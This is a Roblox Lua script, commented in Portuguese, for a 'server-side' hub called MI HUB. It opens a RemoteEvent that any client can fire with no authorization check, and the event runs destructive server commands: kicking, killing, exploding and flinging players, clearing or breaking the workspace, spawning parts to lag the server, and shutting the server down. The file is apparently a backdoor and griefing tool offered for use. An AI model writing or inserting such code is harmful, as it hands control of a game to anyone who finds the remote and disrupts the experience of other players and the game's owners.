-- Painel Server-Side com AURA UI (Tema Hell)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local IS_SERVER = RunService:IsServer()

-- ============================================================
-- 1. LÓGICA DO SERVIDOR (Handlers)
-- ============================================================
if IS_SERVER then
    -- Limpeza de execuções anteriores
    if ReplicatedStorage:FindFirstChild("MI_HUB_REMOTE_CMD") then
        ReplicatedStorage.MI_HUB_REMOTE_CMD:Destroy()
    end

    local remote = Instance.new("RemoteEvent")
    remote.Name = "MI_HUB_REMOTE_CMD"
    remote.Parent = ReplicatedStorage

    local function getHum(p) return p.Character and p.Character:FindFirstChildOfClass("Humanoid") end
    local function getHRP(p) return p.Character and p.Character:FindFirstChild("HumanoidRootPart") end
    local function getTarget(name)
        if name == "ALL" then return "ALL" end
        return Players:FindFirstChild(name)
    end

    remote.OnServerEvent:Connect(function(player, cmd, args)
        args = type(args) == "table" and args or {}
        
        -- Comandos de Admin
        if cmd == "kick" then
            local target = getTarget(args.target)
            if target == "ALL" then
                for _, p in ipairs(Players:GetPlayers()) do if p ~= player then p:Kick(args.reason or "Kicked") end end
            elseif target then target:Kick(args.reason or "Kicked") end
            
        elseif cmd == "kill" then
            local target = getTarget(args.target)
            if target == "ALL" then
                for _, p in ipairs(Players:GetPlayers()) do local h = getHum(p); if h then h.Health = 0 end end
            elseif target then local h = getHum(target); if h then h.Health = 0 end end
            
        elseif cmd == "explode" then
            local target = getTarget(args.target)
            if target == "ALL" then
                for _, p in ipairs(Players:GetPlayers()) do 
                    local r = getHRP(p); if r then
                        local ex = Instance.new("Explosion"); ex.BlastRadius = 30; ex.Position = r.Position; ex.Parent = workspace
                    end
                end
            elseif target then 
                local r = getHRP(target); if r then
                    local ex = Instance.new("Explosion"); ex.BlastRadius = 30; ex.Position = r.Position; ex.Parent = workspace
                end
            end
            
        elseif cmd == "fling" then
            local target = getTarget(args.target)
            if target == "ALL" then
                for _, p in ipairs(Players:GetPlayers()) do 
                    local r = getHRP(p); if r then
                        local bv = Instance.new("BodyVelocity"); bv.Velocity = Vector3.new(math.random(-1000,1000), 5000, math.random(-1000,1000)); bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge); bv.Parent = r
                        task.delay(2, function() if bv then bv:Destroy() end end)
                    end
                end
            elseif target then
                local r = getHRP(target); if r then
                    local bv = Instance.new("BodyVelocity"); bv.Velocity = Vector3.new(math.random(-1000,1000), 5000, math.random(-1000,1000)); bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge); bv.Parent = r
                    task.delay(2, function() if bv then bv:Destroy() end end)
                end
            end
            
        -- Comandos Destrutivos (Server)
        elseif cmd == "clear_workspace" then
            for _, v in ipairs(workspace:GetChildren()) do
                if v:IsA("Model") or v:IsA("BasePart") then pcall(function() v:Destroy() end) end
            end
            
        elseif cmd == "break_all" then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then pcall(function() v.Anchored = false; v.CanCollide = false end) end
            end
            
        elseif cmd == "anchor_all" then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then pcall(function() v.Anchored = true end) end
            end
            
        elseif cmd == "lag_server" then
            for _ = 1, 100 do
                task.spawn(function()
                    local p = Instance.new("Part")
                    p.Size = Vector3.new(100,100,100)
                    p.Position = Vector3.new(math.random(-1000,1000), math.random(100,500), math.random(-1000,1000))
                    p.Anchored = false; p.Parent = workspace
                    task.delay(3, function() if p then p:Destroy() end end)
                end)
            end
            
        elseif cmd == "kill_all" then
            for _, p in ipairs(Players:GetPlayers()) do
                local h = getHum(p); if h then h.Health = 0 end
            end
            
        elseif cmd == "kick_all" then
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= player then p:Kick("Server Wiped") end
            end
            
        elseif cmd == "shutdown" then
            for _, p in ipairs(Players:GetPlayers()) do pcall(function() p:Kick("Server Shutdown") end) end
            task.wait(0.5)
            pcall(function() game:Shutdown() end)
        end
    end)
    
    print("[MI HUB] Server-side handlers carregados.")
end

